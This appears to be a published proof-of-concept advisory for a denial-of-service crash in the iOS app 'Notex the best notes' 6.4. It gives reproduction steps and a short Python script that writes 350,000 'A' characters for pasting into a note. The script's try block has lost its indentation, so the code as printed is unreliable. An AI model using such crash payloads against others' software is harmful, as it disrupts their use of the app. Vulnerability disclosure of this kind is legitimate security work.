# Exploit Title: Notex the best notes 6.4 - Denial of Service (PoC)
# Date: 06-14-2021
# Author: Geovanni Ruiz
# Download Link: https://apps.apple.com/us/app/notex-the-best-notes/id847994217
# Version: 6.4
# Category: DoS (iOS)

##### Vulnerability #####

Notex – the best notes is vulnerable to a DoS condition when a long list of
characters is being used when creating a note:

# STEPS #
# Open the program.
# Create a new Note.
# Run the python exploit script payload.py, it will create a new payload.txt file
# Copy the content of the file "payload.txt"
# Paste the content from payload.txt twice in the new Note.
# Crashed

Successful exploitation will cause the application to stop working.

I have been able to test this exploit against iOS 14.2.

##### PoC #####
--> payload.py <--
#!/usr/bin/env python
buffer = "\x41" * 350000

try:
f = open("payload.txt","w")
f.write(buffer)
f.close()
print ("File created")
except:
print ("File cannot be created")